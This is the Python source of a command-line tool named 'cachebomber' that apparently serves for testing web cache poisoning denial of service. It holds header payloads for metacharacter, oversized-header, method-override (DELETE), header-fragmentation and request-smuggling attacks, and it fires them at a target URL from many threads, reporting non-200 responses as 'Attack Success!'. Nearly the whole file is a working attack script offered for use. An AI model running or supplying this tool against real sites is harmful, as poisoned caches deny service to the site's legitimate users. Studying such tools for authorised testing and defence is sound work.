import requests
import concurrent.futures
import argparse 
import time
import sys
from random import choice
from string import ascii_lowercase

payload1 = {'X-Metachar-Header' : '\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07metahttptest'}
payload2 = {'X-Oversized-Header' : 'largelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelargelarge'}
payload3 = {'X-HTTP-Method-Override' : 'DELETE'}
payload4 = {'X-Fragmented-Header': 'A' * 10000}

# HTTP Request Smuggling
payload5 = {
    'Content-Type': 'multipart/form-data; boundary=------------------------9051914041544843365972754266',
    'Transfer-Encoding': 'chunked',
    'Content-Length': '10000'
}

# HTTP Parameter Pollution
payload6 = {'param1': 'value1', 'param1': 'value2'}

RED = "\033[91m"
YELLOW = "\033[93m"
LIGHT_GREEN = "\033[92;1m"
LIGHT_BLUE = "\033[96m"
RESET = "\033[0m"

class CustomFormatter(argparse.HelpFormatter):
    def format_help(self):
        help_str = super().format_help()
        art_str = r"""                                                        
 .----------------. .----------------. .----------------. .----------------. .----------------.   .----------------. .----------------. .----------------. .----------------. .----------------. .----------------. 
| .--------------. | .--------------. | .--------------. | .--------------. | .--------------. | | .--------------. | .--------------. | .--------------. | .--------------. | .--------------. | .--------------. |
| |     ______   | | |   _    _     | | |     ______   | | |  ____  ____  | | |    ______    | | | |   ______     | | |     ____     | | | ____    ____ | | |   ______     | | |    ______    | | |  _______     | |
| |   .' ___  |  | | |  | |  | |    | | |   .' ___  |  | | | |_   ||   _| | | |   / ____ `.  | | | |  |_   _ \    | | |   .'    '.   | | ||_   \  /   _|| | |  |_   _ \    | | |   / ____ `.  | | | |_   __ \    | |
| |  / .'   \_|  | | |  | |__| |_   | | |  / .'   \_|  | | |   | |__| |   | | |   `'  __) |  | | | |    | |_) |   | | |  |  .--.  |  | | |  |   \/   |  | | |    | |_) |   | | |   `'  __) |  | | |   | |__) |   | |
| |  | |         | | |  |____   _|  | | |  | |         | | |   |  __  |   | | |   _  |__ '.  | | | |    |  __'.   | | |  | |    | |  | | |  | |\  /| |  | | |    |  __'.   | | |   _  |__ '.  | | |   |  __ /    | |
| |  \ `.___.'\  | | |      _| |_   | | |  \ `.___.'\  | | |  _| |  | |_  | | |  | \____) |  | | | |   _| |__) |  | | |  |  `--'  |  | | | _| |_\/_| |_ | | |   _| |__) |  | | |  | \____) |  | | |  _| |  \ \_  | |
| |   `._____.'  | | |     |_____|  | | |   `._____.'  | | | |____||____| | | |   \______.'  | | | |  |_______/   | | |   '.____.'   | | ||_____||_____|| | |  |_______/   | | |   \______.'  | | | |____| |___| | |
| |              | | |              | | |              | | |              | | |              | | | |              | | |              | | |              | | |              | | |              | | |              | |
| '--------------' | '--------------' | '--------------' | '--------------' | '--------------' | | '--------------' | '--------------' | '--------------' | '--------------' | '--------------' | '--------------' |
 '----------------' '----------------' '----------------' '----------------' '----------------'   '----------------' '----------------' '----------------' '----------------' '----------------' '----------------'                                                                                                                                                                                                                  
        """        
        return art_str + "\n" + help_str




def send_request(url, payloadType, r, s):
    headers = globals()[payloadType]
    resp = s.get(url, headers=headers)
    respCode = resp.status_code
    if respCode != 200 and respCode != 429:
        print(f"\r[~] Request {LIGHT_GREEN}{r}{RESET} Status: {RED}{respCode}{RESET} {RED}[Attack Success! Browse URL to Validate]{RESET}", end="")
    else:
        print(f"\r[~] Request {LIGHT_GREEN}{r}{RESET} Status: {YELLOW}{respCode}{RESET} {YELLOW}[Normal Response Received]{RESET}", end=" " * 14)

    #print(f"[+++] Servers Response: \n{resp.content}")


def main():
    parser = argparse.ArgumentParser(prog='cachebomber', 
                                    description= 'Tool to test web cache poisoning DoS (CPDoS)',
                                    usage='%(prog)s -u URL -t THREADS -p PAYLOADTYPE -r REQUESTS')

    parser = argparse.ArgumentParser(formatter_class=CustomFormatter)
    parser.add_argument("-u", "--url", help="URL of Target", required=True)
    parser.add_argument("-t", '--threads', help="Number of Threads (Default=20)", nargs='?', type=int)
    parser.add_argument("-p", "--payload", help="Payload to use (1. HTTP Metachar, 2. Oversize Header, 3. Method Override, 4. HTTP Header Fragmentation, 5. HTTP Request Smuggling)", nargs='?', type=int)
    parser.add_argument("-r", "--request", help="Number of Requests (Default=100)", nargs='?', type=int)
    parser.add_argument("-c", "--cachebuster", default=False, action=argparse.BooleanOptionalAction)

    args = parser.parse_args()

    url = args.url
    threads = args.threads or 20
    payload = args.payload or 1
    requestCount = args.request or 100
    cachebusterFlag = args.cachebuster
    
    print("[*] Initializing CacheBomber")
    print(f"[*] Number of Threads: {threads}")
    print(f"[*] Requests to send: {requestCount}")

    cacheBusterMode = "NO"
    start = time.perf_counter()

    if payload == 1:
        payloadType = "payload1"
        print(f"[*] Using Payload 1: {RED}HTTP Metachar Header{RESET}")
    elif payload == 2:
        payloadType = "payload2"
        print(f"[*] Using Payload 2: {RED}Oversized HTTP Header{RESET}")
    elif payload == 3:
        payloadType = "payload3"
        print(f"[*] Using Payload 3: {RED}HTTP Method Override{RESET}")
    elif payload == 4:
        payloadType = "payload4"
        print(f"[*] Using Payload 4: {RED}HTTP Header Fragmentation{RESET}")
    elif payload == 5:
        payloadType = "payload5"
        print(f"[*] Using Payload 5: {RED}HTTP Request Smuggling{RESET}")
    else:
        print(f"[!] {RED}Invalid Payload! View payloads with -h flag{RESET}")
        exit()

    s = requests.Session()

    if cachebusterFlag:
        cacheBusterMode = "YES"
        url = url + "?buster=" + ''.join(choice(ascii_lowercase) for i in range(8))
        print(f"[+] Using Cachebuster: {LIGHT_GREEN}{cacheBusterMode}{RESET}")
    else:
        print(f"[+] Using Cachebuster: {RED}{cacheBusterMode}{RESET}")
    
    print(f"[+] Sending Payload to {LIGHT_BLUE}{url}{RESET}")
        
    with concurrent.futures.ThreadPoolExecutor(max_workers=int(threads)) as executor:
        for r in range(requestCount + 1):
            executor.submit(send_request(url, payloadType, r, s))
    
    finish = time.perf_counter()
    print(f'\n[+] Sent {requestCount} payload requests in {round(finish-start, 2)} second(s)')


if __name__ == '__main__':
    main()
